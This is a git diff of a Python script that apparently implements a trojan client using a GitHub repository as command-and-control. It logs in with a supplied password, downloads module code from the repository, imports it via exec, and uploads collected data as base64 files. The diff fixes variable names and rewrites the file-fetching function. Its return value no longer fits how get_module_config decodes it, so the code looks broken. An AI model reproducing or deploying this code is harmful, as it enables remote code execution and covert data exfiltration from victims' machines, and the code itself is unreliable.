@@ -9,10 +9,10 @@ import os
 
 from github3 import login
 
-moudle_id = 'm'
-moudle_conifg = moudle_id +'.json'
-data_path = 'data/{}/'.format(moudle_id)
-moudles = []
+module_id = 'm'
+module_config_path = module_id +'.json'
+data_path = 'data/{}/'.format(module_id)
+modules = []
 configured = False
 task_queue = queue.Queue()
 password = sys.argv[1]
@@ -20,7 +20,7 @@ password = sys.argv[1]
 
 def connect_to_github():
     gh = login(username="yanganto", password=password)
-    repo = gh.repository("yanganto", 'python-tools')
+    repo = gh.repository("yanganto", 'InAir')
     branch = repo.branch('master')
     
     return gh, repo, branch
@@ -29,30 +29,38 @@ def get_file_content(filepath):
 
     gh, repo, branch = connect_to_github()
     tree = branch.commit.commit.tree.recurse()
+
+    with open(filepath, 'r') as fin:
+        module_config = json.loads(fin.read())
     
-    for fname in tree.to_json()['tree']:
-        print(fname['path'])
-        """
-        if filepath in fname.path:
-            print("[*] Found file {}".format(filepath))
-            blob = repo.blob(fname._json_data['sha'])
-            return blob.content
-"""
+    modules = {}
+
+    
+    for file_in_repo  in tree.to_json()['tree']:
+        if file_in_repo['path'] in [m['module'] + '.py' for m in module_config]:
+            print("[*] Found file {}".format(file_in_repo['path']))
+            text = base64.b64decode(repo.blob(file_in_repo['sha']).content).decode('utf-8')
+            print(text)
+            modules[file_in_repo['path'].replace('.py', '')] = text
+
+    print(modules)
+    return modules
 
 def get_module_config():
     global configured
-    config_json = get_file_content(moudle_conifg)
+    config_json = get_file_content(module_config_path)
+    print(config_json)
     config = json.loads(base64.b64decode(config_json))
     configured = True
 
     for task in config:
-        if task['module'] not in sys.moudles:
+        if task['module'] not in sys.modules:
             exec('import ' + task['module'])
     return config
 
 def store_module_result(data):
     gh, repo, branch = connect_to_github()
-    remote_path = "data/{}/{}.data".format(moudle_id, random.randint(1000,10000))
+    remote_path = "data/{}/{}.data".format(module_id, random.randint(1000,10000))
     repo.create_file(remote_path, "Commit message", base64.b64encode(data))
     return 
 
